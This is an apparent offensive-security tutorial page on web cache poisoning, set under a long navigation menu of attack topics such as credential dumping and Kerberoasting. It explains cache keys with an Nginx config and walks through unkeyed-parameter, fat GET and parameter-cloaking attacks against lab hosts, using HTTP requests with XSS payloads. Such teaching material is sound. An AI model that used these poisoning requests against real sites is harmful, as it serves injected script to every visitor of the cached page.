+      Se Backup Privilege</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/sedebugprivilege/" class="">
+      Se Debug Privilege</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/seimpersonateprivilege/" class="">
+      Se Impersonate Privilege</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/serestoreprivilege/" class="">
+      Se Restore Privilege</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/server-operators/" class="">
+      Server Operators</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/setakeownershipprivilege/" class="">
+      Se Take Ownership Privilege</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/credential-looting/" class="">
+      Credential Looting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/dpapi/" class="">
+      Dpapi</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/enumeration/" class="">
+      Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/printnightmare/" class="">
+      Print Nightmare</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/uac-bypass/" class="">
+      Uac Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/user-interactions/" class="">
+      User Interactions</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ad0adecc90d787090f7f3f2c668562f3" class="toggle"  />
+    <label for="section-ad0adecc90d787090f7f3f2c668562f3" class="flex">
+      <a role="button" class="">
+        07. Credential Looting</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/07.-credential-looting/dump-lsass/" class="">
+      Dump Lsass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/07.-credential-looting/dump-sam/" class="">
+      Dump Sam</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/07.-credential-looting/kerberos-keytab---linux/" class="">
+      Kerberos Keytab Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/07.-credential-looting/kerberos-kirbi---windows/" class="">
+      Kerberos Kirbi Windows</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/07.-credential-looting/laps/" class="">
+      Laps</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/07.-credential-looting/virtual-disks/" class="">
+      Virtual Disks</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2c02c5639835e2c5e10145947a8080b5" class="toggle"  />
+    <label for="section-2c02c5639835e2c5e10145947a8080b5" class="flex">
+      <a role="button" class="">
+        08. Discovery</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/08.-discovery/network-hosts/" class="">
+      Network Hosts</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/08.-discovery/password-policy/" class="">
+      Password Policy</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/08.-discovery/ping-sweep/" class="">
+      Ping Sweep</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/08.-discovery/user-enumeration/" class="">
+      User Enumeration</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-07686cc097df585dc242bc14dc089ca4" class="toggle"  />
+    <label for="section-07686cc097df585dc242bc14dc089ca4" class="flex">
+      <a role="button" class="">
+        09. Pivoting</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/09.-pivoting/chisel/" class="">
+      Chisel</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/09.-pivoting/dnscat2/" class="">
+      Dnscat2</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/09.-pivoting/ligolo-ng/" class="">
+      Ligolo Ng</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/09.-pivoting/metasploit/" class="">
+      Metasploit</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/09.-pivoting/port-forward/" class="">
+      Port Forward</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/09.-pivoting/ssh/" class="">
+      SSH</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-e1e0aa139ebb047bc9559800a509d69c" class="toggle"  />
+    <label for="section-e1e0aa139ebb047bc9559800a509d69c" class="flex">
+      <a role="button" class="">
+        10. Lateral Movement</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/adcs-attacks/" class="">
+      Adcs Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/bloodhound/" class="">
+      Bloodhound</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/dacl-abuse/" class="">
+      Dacl Abuse</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/dcsync/" class="">
+      Dcsync</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/enumeration/" class="">
+      Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/impacket-exec/" class="">
+      Impacket *Exec</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/kerberoasting/" class="">
+      Kerberoasting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/kerberos/" class="">
+      Kerberos</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/nopac/" class="">
+      No Pac</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/ntlm-relay/" class="">
+      Ntlm Relay</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/password-spray---from-linux/" class="">
+      Password Spray From Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/password-spray---from-windows/" class="">
+      Password Spray From Windows</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/rdp-session-hijacking/" class="">
+      Rdp Session Hijacking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/relay-potato/" class="">
+      Relay Potato</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/runas/" class="">
+      Runas</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-0bb2b04e93944d81f8c46b09caf99f9f" class="toggle"  />
+    <label for="section-0bb2b04e93944d81f8c46b09caf99f9f" class="flex">
+      <a role="button" class="">
+        File Transfer</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/edge-cases/" class="">
+      Edge Cases</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/encrypted-transfer/" class="">
+      Encrypted Transfer</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/linux-target/" class="">
+      Linux Target</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/nginx/" class="">
+      Nginx</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/rdp/" class="">
+      Rdp</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/windows-target/" class="">
+      Windows Target</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/winrm/" class="">
+      Win Rm</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-27f3a00f046f423a04ef1a6857a1d881" class="toggle"  />
+    <label for="section-27f3a00f046f423a04ef1a6857a1d881" class="flex">
+      <a role="button" class="">
+        Misc</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/misc/interactive-shell/" class="">
+      Interactive Shell</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/misc/python-eval-bypass/" class="">
+      Python Eval Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/misc/tips-and-setup/" class="">
+      Tips and Setup</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c4c7affcc57db383fea3db37de311743" class="toggle"  />
+    <label for="section-c4c7affcc57db383fea3db37de311743" class="flex">
+      <a role="button" class="">
+        Password Crack</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/password-crack/hashcat/" class="">
+      Hashcat</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/password-crack/hashid/" class="">
+      Hash ID</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/password-crack/john/" class="">
+      John</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-693d6624a689f7e347a0baca206ef8ad" class="toggle"  />
+    <label for="section-693d6624a689f7e347a0baca206ef8ad" class="flex">
+      <a role="button" class="">
+        Syntax Cheatsheets</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/cewl/" class="">
+      Cewl</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/metasploit/" class="">
+      Metasploit</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/nodejs/" class="">
+      Node Js</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/openssl/" class="">
+      Open Ssl</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/powershell/" class="">
+      Powershell</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/sed/" class="">
+      Sed</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/shell-fu/" class="">
+      Shell Fu</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/sql-syntax/" class="">
+      SQL Syntax</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/sqlmap/" class="">
+      Sqlmap</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header hidden">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/spellbook/icons/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>Cache Poisoning</h3>
+
+  <label for="toc-control">
+    
+    <img src="/spellbook/icons/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#tools">Tools</a></li>
+    <li><a href="#find-unkeyed-parameters">Find Unkeyed Parameters</a></li>
+    <li><a href="#fat-get">Fat GET</a></li>
+    <li><a href="#parameter-cloaking">Parameter Cloaking</a></li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><h1 id="overview">Overview<a class="anchor" href="#overview">#</a></h1>
+<p>Web cache is a way to save response from server, so when a user request the same resource, it can just serve the same response again without having to bother the server again.
+Web cache use certain parameters in the request to determine if it should serve the same response or fetching new one. These are called <strong>Cache Key</strong></p>
+<p><strong>Cache Keys</strong> can be parameters like these, including but not limited to:</p>
+<ul>
+<li><code>Host:</code> header</li>
+<li>Scheme like <code>http://</code> or <code>https://</code></li>
+<li>Paths like <code>GET /admin</code></li>
+<li>Parameters like <code>GET /page?language=en</code></li>
+</ul>
+<p>What is in <strong>cache keys</strong> is called <strong>keyed</strong> parameters, what not is called <strong>unkeyed</strong></p>
+<p>This is how a web cache config looks like in <code>Nginx</code></p>
+<pre tabindex="0"><code>http {
+  proxy_cache_path /cache levels=1:2 keys_zone=STATIC:10m inactive=24h max_size=1g;
+
+  server {
+    listen       80;
+
+    location / {
+      proxy_pass             http://172.17.0.1:80;
+      proxy_buffering        on;
+      proxy_cache            STATIC;
+      proxy_cache_valid      2m;
+      proxy_cache_key $scheme$proxy_host$uri$args;
+      add_header X-Cache-Status $upstream_cache_status;
+    }
+  }
+}</code></pre><p>Here is a short explanation of the parameters. For a more detailed overview, have a look at the Nginx documentation <a href="https://nginx.org/en/docs/http/ngx_http_proxy_module.html">here</a>:</p>
+<ul>
+<li><code>proxy_cache_path</code> sets general parameters of the cache, like the storage location</li>
+<li><code>proxy_pass</code> sets the location of the web server to request resource</li>
+<li><code>proxy_buffering</code> enables caching</li>
+<li><code>proxy_cache</code> sets the name of the cache (as defined in <code>proxy_cache_path</code>)</li>
+<li><code>proxy_cache_valid</code> sets the time after which the cache expires</li>
+<li><code>proxy_cache_key</code> defines the cache key</li>
+<li><code>add_header</code> adds the <code>X-Cache-Status</code> header to responses to indicate whether the response was cached</li>
+</ul>
+<p>We can also set the <strong>cache key</strong> to specific GET parameter like this. With this, <code>http://server.com/?language=en</code> and <code>http://server.com/?language=en&amp;param2=2</code> serves the same response.</p>
+<pre tabindex="0"><code>proxy_cache_key $scheme$proxy_host$uri$arg_language;</code></pre><h1 id="attacks">Attacks<a class="anchor" href="#attacks">#</a></h1>
+<p>Most of attacks are basically XSS. But we still have to find an actual XSS vulnerability in the webapp, then poison the cache.</p>
+<p>The hard part of finding XSS in with web cache is most of the time we are served a cached response, due to the large number of users. We can try these HTTP header to force hitting the webapp, even if there is a cached response. Most web cache respects this.</p>
+<ul>
+<li><code>Cache-Control: no-cache</code></li>
+<li><code>Pragma: no-cache</code> This one is deprecated, but we can still try</li>
+</ul>
+<p>Still, those are just for testing purposes. When we want to actually poison the cache, we still have to determine the right timing when the cache expire, then send our payload to renew the cache that serves our payload.</p>
+<p>Another way we can do this is <strong>cache busting</strong>. We need to find a parameter that no one would input invalid values like <code>?language=</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /index.php?language=invalidValue&amp;ref=something <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span></span></span></code></pre></div><p>And we test XSS on other parameters. Each time we test, <strong>we have to change the value in <code>?language=</code> parameter</strong> to always hit the webapp, not the cache server</p>
+<h2 id="tools">Tools<a class="anchor" href="#tools">#</a></h2>
+<p>Install if on kali</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo apt install web-cache-vulnerability-scanner</span></span></code></pre></div><p>Otherwise, use <code>go</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>go install -v github.com/Hackmanit/Web-Cache-Vulnerability-Scanner@latest</span></span></code></pre></div><p>We can run the tool like this. <code>-gr</code> to generate report:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>wcvs -u http://simple.wcp.htb/ -sp language<span style="color:#f92672">=</span>en -gr</span></span></code></pre></div><p>The tool can also help us identify more advanced web cache poisoning vulnerabilities that require the exploitation of fat GET requests or parameter cloaking</p>
+<h2 id="find-unkeyed-parameters">Find Unkeyed Parameters<a class="anchor" href="#find-unkeyed-parameters">#</a></h2>
+<p>After finding a vulnerability like XSS, we can try to see if the parameter is unkeyed.</p>
+<p>So we send this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /index.php?language=en&amp;ref=something <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span></span></span></code></pre></div><p>The cache server response with a <code>MISS</code>, meaning that this response was never cached before</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span>X-Cache-Status<span style="color:#f92672">:</span> <span style="color:#ae81ff">MISS</span></span></span></code></pre></div><p>We send the same thing again, to see if it is actually cached, and it is</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span>X-Cache-Status<span style="color:#f92672">:</span> <span style="color:#ae81ff">HIT</span></span></span></code></pre></div><p>Then we send the same thing with different value in the <code>ref</code> parameter like this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /index.php?language=en&amp;ref=abc <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span></span></span></code></pre></div><p>And the cache server response with a <code>HIT</code>, indicating that this response is cached, meaning that no matter what the <code>ref=</code> GET parameter is, it will serve the same cache</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span>X-Cache-Status<span style="color:#f92672">:</span> <span style="color:#ae81ff">HIT</span></span></span></code></pre></div><p>Now we can exploit it by timing the right moment when the cache expired, we immediately poison the cache</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /index.php?language=en&amp;ref=&#34;&gt;&lt;script&gt;alert(1)&lt;/script&gt; <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span></span></span></code></pre></div><p>And now whenever someone access <code>/index.php?language=en</code>, it will be served a cached page that contains our XSS payload.</p>
+<h2 id="fat-get">Fat GET<a class="anchor" href="#fat-get">#</a></h2>
+<p>I&rsquo;m sorry GET. You&rsquo;re not that fat</p>
+<p>According to <a href="https://www.rfc-editor.org/rfc/rfc7231#section-4.3.1">RFC 7231</a>, GET request can have a body, but it won&rsquo;t have any effect, so these request are semantically equivalent:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /index.php?param1=Hello&amp;param2=World <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">fatget.wcp.htb</span></span></span></code></pre></div><p>And this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /index.php?param1=Hello&amp;param2=World <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">fatget.wcp.htb</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>param3=123</span></span></code></pre></div><p>But depends on the web server config (not the webapp), It will have an effect, which can lead to cache poisoning attack vectors that would otherwise be unexploitable.</p>
+<p>Lets take a look. We sent this request, with <code>language</code> GET parameter both on the URL and body, but different value. We got a page in German.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /index.php?language=en <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">fatget.wcp.htb</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">11</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>language=de</span></span></code></pre></div><p>Now we need to see if there is a discrepancy between the web cache and the webapp. We send the same request but no body, but we still get a page in German</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /index.php?language=en <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">fatget.wcp.htb</span></span></span></code></pre></div><p>That means there is a discrepancy. We can exploit this by using a <strong>keyed</strong> parameter that is vulnerable to XSS.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /index.php?language=en <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">fatget.wcp.htb</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ref=&#34;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span></span></code></pre></div><h2 id="parameter-cloaking">Parameter Cloaking<a class="anchor" href="#parameter-cloaking">#</a></h2>
+<p>Some web server, like Python web framework <a href="https://bottlepy.org/docs/dev/">Bottle</a> allows a semicolon (or other special characters) to separate different URL parameters. For example, GET request to <code>/test?a=1;b=2</code> means <code>a=1</code> and <code>b=2</code> for <code>bottle</code>, but the web cache might interprets <code>a</code> as <code>1;b=2</code></p>
+<p>The vulnerability was disclosed under <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-28473">CVE-2020-28473</a></p>
+<p>Now, let&rsquo;s create a discrepancy between the web cache and the web server. We send a request like this. <code>a</code> is an non-functional and unkeyed parameter. We got a German page</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /?language=en&amp;a=b;language=de <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">cloak.wcp.htb</span></span></span></code></pre></div><p>Now let&rsquo;s do that again but only with <code>?language=en</code>. We still get a German page. There is a discrepancy between the web cache and the webapp.</p>
+<p>The web cache sees <code>language=en</code> and <code>a=b;language=de</code> parameters.</p>
+<p>But the web server sees <code>language=en</code>, <code>a=b</code> and <code>language=de</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /?language=en <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
